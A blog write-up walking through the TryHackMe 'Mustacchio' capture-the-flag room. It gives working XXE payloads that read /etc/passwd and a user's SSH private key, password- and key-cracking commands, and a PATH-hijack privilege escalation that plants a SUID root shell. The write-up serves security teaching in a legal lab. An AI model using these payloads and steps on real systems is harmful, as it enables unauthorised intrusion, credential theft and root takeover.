---
slug: mustacchio
title: Mustacchio CTF
authors: [hueami]
tags: [tryhackme, ctf, xee, lpe]
comments: true
---

## Solving the Mustacchio Room on TryHackMe

This post details a comprehensive walkthrough of identifying and exploiting vulnerabilities within the as 'easy' tagged [Mustacchio](https://tryhackme.com/room/mustacchio) room on TryHackMe. The objective is to systematically enumerate services, exploit found vulnerabilities for initial access, escalate privileges, and capture flags, providing a technical perspective on ethical hacking practices.

<!-- truncate -->

### Initial Enumeration with Nmap

The initial step involved conducting a network scan using `nmap` to enumerate open ports and available services on the target:

```bash
nmap [target IP] -p0-
```

This scan identified several open ports:
```bash
22/tcp for SSH
80/tcp for HTTP
8765/tcp for ultraseek-http
```

### Discovering Hidden Resources with Feroxbuster

Subsequently, `feroxbuster` was employed to aggressively search for hidden directories and files, revealing a notable file: `users.bak`.

```bash
feroxbuster -u http://[target IP] -w ~/security/wordlists/SecLists/Discovery/Web-Content/directory-list-2.3-medium.txt
```

### Extracting Credentials

The `users.bak` file uncovered by `feroxbuster` contained what seemed to be user credentials:

`admin1868e36a6d2b17d4c2745f1659433a**********`

I utilized the password-cracking service [CrackStation](https://crackstation.net/) to decrypt the obscured password.

### Exploiting XXE to Gain Initial Access

Navigating to `http://10.10.3.119:8765`, I utilized the credentials previously discovered in `users.bak` to log in, unveiling a form designed for posting comments. Upon submission, the form presents a preview showcasing fields for Name, Author, and Comment, which intriguingly populate only when an XML containing corresponding tags is supplied. This peculiar behavior hinted at the potential for XML External Entity (XXE) exploitation.

Leveraging this insight, I crafted an XML payload aiming to probe for XXE vulnerabilities by attempting to fetch system files. The first payload sought to retrieve the `/etc/passwd` file to obtain possible users for ssh login:

```xml
<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE xxe [ <!ENTITY file SYSTEM "file:///etc/passwd"> ]>
<comment>
    <name>&file;</name>
</comment>
```

This yielded promising results, disclosing several user accounts, notably `joe` and `barry`.

To further exploit this avenue, a subsequent XML payload targeted the retrieval of SSH keys for these users. It became apparent that while Joe lacked an SSH key, Barry possessed one:

```xml
<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE xxe [ <!ENTITY file SYSTEM "file:///home/barry/.ssh/id_rsa"> ]>
<comment>
    <name>&file;</name>
</comment>
```

However, the ssh key was secured with a passphrase, necessitating its decryption. Using the tools `ssh2john` and `john the ripper` alongside the famous `rockyou.txt` wordlist, I cracked the passphrase.

```bash
python /opt/homebrew/Cellar/john-jumbo/1.9.0_1/share/john/ssh2john.py ~/security/temp/id_barry.rsa > id_rsa_barry_hash

john --wordlist=~/security/wordlists/rockyou.txt ~/security/temp/id_rsa_barry_hash
```

With the decrypted key, I successfully SSH'd into the system as Barry:

```bash
ssh -i id_rsa_barry barry@[target IP]
```

Upon gaining access, I found the user flag.

### Privilege Escalation

For privilege escalation, I sought files with the SUID bit set, which could be exploited to gain elevated privileges. When a file with SUID bit has the owner `root`, the file is executed with `root`'s privileges, regardless of the user who executed the file:

```bash
find / -perm -u=s -type f 2>/dev/null
```

An intriguing file, `/home/joe/live_log`, was identified, with SUID flag set and the owner `root``. Analyzing it with `strings /home/joe/live_log` suggested it executed another program, `tail`, without an absolute path. This was exploitable via a path injection:

To exploit this, I created a malicious `tail` script, intending to copy the system's `tail` binary and obtain root's privileges by also setting the SUID bit:

```bash
#!/bin/bash
cp /bin/bash /tmp/bash
chmod 4777 /tmp/bash
```

By adjusting the `PATH` to prioritize the current directory, the system executed my malicious script instead of the legitimate `tail`:

```bash
export PATH=`pwd`:$PATH
```

Executing `/home/joe/live_log` then invoked my script, creating a SUID bash shell in `/tmp/bash`, which granted a root shell when run with the `-p` flag:

```bash
/tmp/bash -p
```

Accessing `/root/root.txt`, I captured the root flag, completing the privilege escalation process.

### Conclusion

This walkthrough of the Mustacchio room on TryHackMe highlights the criticality of detailed reconnaissance, methodical exploitation, and privilege escalation in cybersecurity. The tools and methodologies discussed, including `nmap`, `feroxbuster`, and the exploitation of XXE and SUID binaries, are essential for cybersecurity practitioners. This experience underscores the ongoing need for vigilance and ethical hacking skills in securing systems.

Engage with curiosity, continue learning, and uphold ethical hacking standards.